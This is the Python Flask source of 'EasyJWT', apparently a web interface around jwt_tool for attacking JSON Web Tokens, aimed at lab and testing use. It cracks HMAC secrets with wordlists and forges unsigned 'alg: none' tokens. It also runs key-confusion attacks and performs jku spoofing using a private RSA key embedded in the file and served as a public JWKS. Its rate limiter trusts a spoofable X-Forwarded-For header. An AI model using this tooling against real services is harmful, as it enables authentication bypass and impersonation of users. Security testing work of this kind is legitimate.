import base64
import re
import jwt
import glob
import json
import os
import subprocess
import tempfile
import time
from functools import wraps

from flask import Flask, jsonify, render_template, request, Response, send_from_directory

app = Flask(__name__)

WORDLISTS_DIR = "/wordlists"
JWT_TOOL = "jwt_tool.py"
MAX_CUSTOM_WORDLIST_BYTES = 2 * 1024 * 1024  # 2 MB
SITE_URL = os.environ.get("SITE_URL", "https://easyjwt.imegz.dev")

# Fixed keypair used for the "Spoof JWKS" exploit when no JWKS URL is given.
# This is intentionally baked into the source and shipped with every copy of
# EasyJWT (local installs and the live site alike), rather than generated per
# instance: the whole point of a default is that a token self-signed by any
# install is verifiable against the SAME public key served from /jwks.json
# on the live site, so solo users without their own hosting still have a
# real, working jku target to point a lab at. It is not a secret, it exists
# purely so test tokens can be forged and verified.
DEFAULT_JWKS_KID = "easyjwt-default-1"
DEFAULT_JWKS_PRIVATE_KEY_PEM = """-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDj/Ff91kLspLjP
8L4UefVBr8KwUEtNpGccbgA1GZGRrBJ3bIzXwyQCY5q+Ux4tw1E4QizhVEgRD09t
x8/1cGJH6/TfR6IBNqCQY1zxGaLxN9XaDmVrioeX2NAVv62ppIb/6Hvbpne4L5Or
GhMzLkoN06+vAuETxZh/J3f0993Vx52KjGNR5h/HRQJK9ZXMDRQb0GiIoDuYsKG/
Kx5aR3IYa1kNgj2jlE3Dzp6GEZzdjgN44ZdHSodoPCp5r9gN7kylWN8YFsWXXOxC
5RV9hzI5GO2LwosUiGQ4Z14iqH1OfKfXGkovsP+RVeQln0Zyg+q6lyivKy6CK91a
iXKxb4wDAgMBAAECggEATdqigcBlYkJuCjR/9KYhJqlKpsMEtCLsQz0dPQTaPRCx
za53+kZdSaOR+GSR7bbBSaDvipMpeQntaePOFFaoeT8OhCEGJbvt4ODNoFfM2Ork
UG6SG8NWwnf7tzGZsFDK+SD/CucyAufcWZWx8Mxh5Y7gc7db/VCA3wsvX6w1SQcY
rhpOTYIMUBLAT0a8gt74kCuoghmET21Nptt1yA5jiJel5L+OxtMVQlvBTlmApwQc
VawxC2+RTHYXfWWw7jwMKoORIPYq7O9nHvDvrTfOmfkG7shjQsMdFkt2l4QiqSAj
EA2fCcTTgGUL053SATqUu52QQTQGlODWH7N0hV33wQKBgQD3QJh/JKNZWtZXVLXn
WBPCBkEhj2/JWytRb2P+GmoWJothSccp+dfUQQ798HNxZAuJTCTT9PSeD9ZfKVIO
XxI4vJZtWnsH3F8sTmAyhrRUIdTbTv9TO7TiGI28Fk6jS9HZ53hVlkN+n+Wi8ORD
Fpl/pPAt0eimhK5PiQIgcPPJyQKBgQDsDT9KiH4ZQwjbtrSuBdjjACTMGcocNblT
MT8WsTK+MVi7o0YWG0d6UV39Wg7sAZ9bLZnGZDgGZkS2ut7tjlEL07cZ4n670ai8
c3F02kdFS0sy3OnP5qmwmHRSK+QNj+Gd787OTyswoP6kZUIEmvWm0M9t0LhC+ynh
FjBiTXMNawKBgCrBk91gs5KvH6OodXBVDc2ekULBcB5M0rfZYFw/qxq7fZzMSlGa
79S3j2UgYIY6O7h5X2D72hU/Pd3k4liz3g3LpuOwIthgJmEeCIqUOrjVxN5L0eFN
0ODMSC4/WUfpw5c/7NI4EuHhuq8rov1q+g5VsmbqBqZNCWudkK2VesLpAoGBAMPD
DL00S1eJ93u3n0o/QSqpANtfe/U/PM3YppicJhgDdrJOax6ESxgPCOLG4F8rzUvh
mokkri3ofI4Kljzu7Rng4BYQd8gtzUFUgEBHkhnOorOw8BtiEVKKbNWE3uG8dID1
003X7Fqs+eG+tCx7ksRgodZR5a5u+8FXFJNB5eu3AoGBAONKYDa/hdqwIIVFtYwf
VOsizMZNA/25Quvjyf7mZOQ9kx+Xg3B6wbkHijdDzKLVU69mHO2iyFlKFXIgVklG
tMTk3r8lpILN25Eo1xDUmtOvWY5VAWOjL39Ms4kDwzml6utKHeEbSXOpgtn/d0kH
lXEwmkWUVCJ2dFomEEUM7M/u
-----END PRIVATE KEY-----"""


def _default_jwks_public_key():
    from cryptography.hazmat.primitives import serialization
    private_key = serialization.load_pem_private_key(
        DEFAULT_JWKS_PRIVATE_KEY_PEM.encode(), password=None,
    )
    return private_key.public_key()


def _b64url_uint(n):
    byte_len = (n.bit_length() + 7) // 8
    return b64url_encode(n.to_bytes(byte_len, "big"))


_DEFAULT_JWKS_PUBLIC_NUMBERS = _default_jwks_public_key().public_numbers()

AUTH_USER = os.environ.get("AUTH_USER")
AUTH_PASS = os.environ.get("AUTH_PASS")

RATE_LIMIT_SECONDS = float(os.environ.get("RATE_LIMIT_SECONDS", "3"))
_last_request = {}


def auth_required(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        if AUTH_USER and AUTH_PASS:
            auth = request.authorization
            if not auth or auth.username != AUTH_USER or auth.password != AUTH_PASS:
                return Response(
                    "Authentication required", 401,
                    {"WWW-Authenticate": 'Basic realm="EasyJWT"'},
                )
        return f(*args, **kwargs)
    return wrapper


def rate_limited(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        ip = request.headers.get("X-Forwarded-For", request.remote_addr or "unknown").split(",")[0].strip()
        now = time.time()
        last = _last_request.get(ip, 0)
        if now - last < RATE_LIMIT_SECONDS:
            wait = round(RATE_LIMIT_SECONDS - (now - last), 1)
            return jsonify({"error": f"Too many requests, wait {wait}s and try again"}), 429
        _last_request[ip] = now
        return f(*args, **kwargs)
    return wrapper


def b64url_decode(segment):
    padding = "=" * (-len(segment) % 4)
    return base64.urlsafe_b64decode(segment + padding)


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


ANSI_ESCAPE_RE = re.compile(r"\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])")


def strip_ansi(text):
    return ANSI_ESCAPE_RE.sub("", text)


def strip_banner(text):
    # jwt_tool prints its ASCII art banner on every run, drop everything
    # up through the "@ticarpi" credit line so the web UI only shows
    # the actual result.
    marker = "@ticarpi"
    idx = text.find(marker)
    if idx != -1:
        text = text[idx + len(marker):]
    return text.lstrip("\n")


# Lines jwt_tool prints on a fresh container (config bootstrap, config file
# path) that carry no useful information for someone using the web UI.
NOISE_LINE_PATTERNS = (
    "No config file yet created",
    "Running config setup",
    'Configuration file built',
    'Make sure to set the "httplistener"',
    "/jwtconf.ini",
)


def strip_noise_lines(text):
    lines = text.split("\n")
    kept = [
        line for line in lines
        if not any(pattern in line for pattern in NOISE_LINE_PATTERNS)
    ]
    return "\n".join(kept)


def run_jwt_tool(args, timeout=120):
    result = subprocess.run(
        ["python3", JWT_TOOL] + args,
        capture_output=True,
        text=True,
        timeout=timeout,
    )
    combined = result.stdout + result.stderr
    combined = strip_ansi(combined)
    combined = strip_banner(combined)
    combined = strip_noise_lines(combined)
    return combined.strip()


def builtin_wordlist_paths():
    if not os.path.isdir(WORDLISTS_DIR):
        return []
    return sorted(glob.glob(os.path.join(WORDLISTS_DIR, "*.txt")))


@app.route("/")
@auth_required
def index():
    return render_template("index.html")


@app.route("/robots.txt")
def robots_txt():
    content = (
        "User-agent: *\n"
        "Allow: /\n"
        "Disallow: /api/\n"
        "\n"
        f"Sitemap: {SITE_URL}/sitemap.xml\n"
    )
    return Response(content, mimetype="text/plain")


@app.route("/sitemap.xml")
def sitemap_xml():
    content = (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n'
        "  <url>\n"
        f"    <loc>{SITE_URL}/</loc>\n"
        "    <changefreq>monthly</changefreq>\n"
        "    <priority>1.0</priority>\n"
        "  </url>\n"
        "</urlset>\n"
    )
    return Response(content, mimetype="application/xml")


@app.route("/favicon.ico")
def favicon_ico():
    return send_from_directory(
        os.path.join(app.root_path, "static"), "favicon.ico",
        mimetype="image/vnd.microsoft.icon",
    )


@app.route("/jwks.json")
def jwks_json():
    # Intentionally public, no auth: this is the whole point of the
    # default key, external servers under test must be able to fetch it
    # with no credentials when they follow a spoofed jku header.
    return jsonify({
        "keys": [{
            "kty": "RSA",
            "use": "sig",
            "alg": "RS256",
            "kid": DEFAULT_JWKS_KID,
            "n": _b64url_uint(_DEFAULT_JWKS_PUBLIC_NUMBERS.n),
            "e": _b64url_uint(_DEFAULT_JWKS_PUBLIC_NUMBERS.e),
        }]
    })


@app.route("/api/decode", methods=["POST"])
@auth_required
def decode():
    token = request.json.get("token", "").strip()
    parts = token.split(".")
    if len(parts) < 2:
        return jsonify({"error": "That does not look like a JWT, expected at least two dot separated parts"}), 400

    try:
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
    except Exception as exc:
        return jsonify({"error": f"Could not decode token: {exc}"}), 400

    signature = parts[2] if len(parts) > 2 else ""
    return jsonify({
        "header": json.dumps(header, indent=2),
        "payload": json.dumps(payload, indent=2),
        "signature": signature,
    })


@app.route("/api/crack", methods=["POST"])
@auth_required
@rate_limited
def crack():
    token = request.form.get("token", "").strip()
    if not token:
        return jsonify({"error": "Token is required"}), 400

    results = {}
    tmp_custom_path = None

    try:
        upload = request.files.get("wordlist")
        if upload and upload.filename:
            upload.seek(0, os.SEEK_END)
            size = upload.tell()
            upload.seek(0)
            if size > MAX_CUSTOM_WORDLIST_BYTES:
                return jsonify({"error": "Custom wordlist is too large, 2 MB max"}), 400

            fd, tmp_custom_path = tempfile.mkstemp(suffix=".txt")
            with os.fdopen(fd, "wb") as f:
                f.write(upload.read())

            try:
                results["Your wordlist"] = run_jwt_tool([token, "-C", "-d", tmp_custom_path])
            except subprocess.TimeoutExpired:
                results["Your wordlist"] = "Crack timed out after 120s, try a smaller wordlist"

        builtins = builtin_wordlist_paths()
        if builtins:
            try:
                combined_fd, combined_path = tempfile.mkstemp(suffix=".txt")
                seen = set()
                with os.fdopen(combined_fd, "w") as out:
                    for path in builtins:
                        with open(path, "r", errors="ignore") as src:
                            for line in src:
                                line = line.rstrip("\n")
                                if line and line not in seen:
                                    seen.add(line)
                                    out.write(line + "\n")
                try:
                    results["Built-in wordlist"] = run_jwt_tool([token, "-C", "-d", combined_path])
                except subprocess.TimeoutExpired:
                    results["Built-in wordlist"] = "Crack timed out after 120s"
            finally:
                if os.path.exists(combined_path):
                    os.remove(combined_path)
        elif not results:
            return jsonify({"error": "No wordlists available, upload a custom one"}), 400

    finally:
        if tmp_custom_path and os.path.exists(tmp_custom_path):
            os.remove(tmp_custom_path)

    return jsonify({"results": results})


@app.route("/api/forge", methods=["POST"])
@auth_required
# No @rate_limited here: this route only does PyJWT/base64 work in-process,
# no jwt_tool subprocess, so it isn't the thing the rate limit protects.
# The guided Exploits flow calls this and then /api/exploit back to back,
# and sharing a limiter with that call would otherwise block the exploit
# call a few seconds after every forge.
def forge():
    data = request.json
    header_json = data.get("header_json", "").strip()
    payload_json = data.get("payload_json", "").strip()
    sign_alg = data.get("sign_alg", "").strip()
    secret = data.get("secret", "")
    private_key = data.get("private_key", "")
    add_typ = bool(data.get("add_typ"))

    if not header_json or not payload_json:
        return jsonify({"error": "Header and payload JSON are both required"}), 400

    try:
        header = json.loads(header_json)
    except Exception as exc:
        return jsonify({"error": f"Header is not valid JSON: {exc}"}), 400
    try:
        payload = json.loads(payload_json)
    except Exception as exc:
        return jsonify({"error": f"Payload is not valid JSON: {exc}"}), 400

    if not isinstance(header, dict):
        return jsonify({"error": "Header must be a JSON object"}), 400
    if not isinstance(payload, dict):
        return jsonify({"error": "Payload must be a JSON object"}), 400

    try:
        if not sign_alg:
            if add_typ:
                header.setdefault("typ", "JWT")
            header.setdefault("alg", "none")
            header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
            payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
            token = f"{header_b64}.{payload_b64}."
        elif sign_alg.startswith("hs"):
            if not secret:
                return jsonify({"error": "HMAC signing needs a secret"}), 400
            # PyJWT's encode() silently injects "typ": "JWT" into the header
            # whenever the header dict has no "typ" key at all. Explicitly
            # setting it to None (falsy) tells PyJWT to leave it out, so the
            # header we send is exactly what the user wrote, unless they
            # opted in to the default via add_typ.
            if "typ" not in header and not add_typ:
                header["typ"] = None
            token = jwt.encode(payload, secret, algorithm=sign_alg.upper(), headers=header)
        else:
            if not private_key:
                return jsonify({"error": "This algorithm needs a private key"}), 400
            if "typ" not in header and not add_typ:
                header["typ"] = None
            token = jwt.encode(payload, private_key, algorithm=sign_alg.upper(), headers=header)
    except Exception as exc:
        return jsonify({"error": f"Could not build the token: {exc}"}), 400

    return jsonify({"token": token})


@app.route("/api/exploit", methods=["POST"])
@auth_required
@rate_limited
def exploit():
    data = request.json
    token = data.get("token", "").strip()
    code = data.get("code", "").strip()
    pubkey = data.get("pubkey", "")
    jwks_url = data.get("jwks_url", "").strip()

    if not token or not code:
        return jsonify({"error": "Token and exploit code are required"}), 400

    args = [token, "-X", code]
    tmp_key_path = None

    if code == "k":
        if not pubkey:
            return jsonify({"error": "Key confusion needs a public key"}), 400
        fd, tmp_key_path = tempfile.mkstemp(suffix=".pem")
        with os.fdopen(fd, "w") as f:
            f.write(pubkey)
        args += ["-pk", tmp_key_path]
    elif code == "s":
        # Always self-sign with EasyJWT's built-in default key, rather than
        # calling jwt_tool (which would generate its own random, unhosted
        # keypair every time). The URL field only controls where the jku
        # header points: EasyJWT's own hosted /jwks.json if left blank, or
        # any URL you paste in, e.g. your own exploit server, if the
        # target's network can't reach easyjwt.imegz.dev. Either way the
        # signature comes from the same fixed key, so whichever JWKS body
        # the target actually fetches, it only needs to contain THIS key's
        # public half (visit /jwks.json yourself in a browser and copy it
        # in, no need to generate a new key anywhere).
        parts = token.split(".")
        if len(parts) < 2:
            return jsonify({"error": "That does not look like a JWT"}), 400
        try:
            header = json.loads(b64url_decode(parts[0]))
            payload = json.loads(b64url_decode(parts[1]))
        except Exception as exc:
            return jsonify({"error": f"Could not decode token: {exc}"}), 400
        if not isinstance(header, dict) or not isinstance(payload, dict):
            return jsonify({"error": "Token header/payload must be JSON objects"}), 400

        default_jwks_url = f"{SITE_URL}/jwks.json"
        target_jku = jwks_url or default_jwks_url
        header["alg"] = "RS256"
        header["jku"] = target_jku
        header["kid"] = DEFAULT_JWKS_KID
        if "typ" not in header:
            header["typ"] = None  # don't let PyJWT silently add one, see /api/forge

        try:
            new_token = jwt.encode(payload, DEFAULT_JWKS_PRIVATE_KEY_PEM, algorithm="RS256", headers=header)
        except Exception as exc:
            return jsonify({"error": f"Could not sign the token: {exc}"}), 400

        if jwks_url:
            note = (
                f"Signed with EasyJWT's built-in default key, jku set to the URL you gave: {target_jku}\n"
                f"Make sure that URL actually serves a JWKS containing this exact key (visit "
                f"{default_jwks_url} yourself and copy its \"keys\" entry into your JWKS body) "
                "or the target won't be able to verify this signature."
            )
        else:
            note = (
                "No JWKS URL given, so jku points at EasyJWT's own hosted default key "
                f"({default_jwks_url}). If the target server can't reach that domain, paste "
                "your own URL above instead (e.g. a lab's exploit server) and host the same "
                f"key there yourself, copied from {default_jwks_url}."
            )

        output = f"{note}\n\nNew JWT:\n\n{new_token}"
        return jsonify({"output": output})

    try:
        output = run_jwt_tool(args)
    except subprocess.TimeoutExpired:
        output = "Request timed out"
    finally:
        if tmp_key_path and os.path.exists(tmp_key_path):
            os.remove(tmp_key_path)

    return jsonify({"output": output})


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
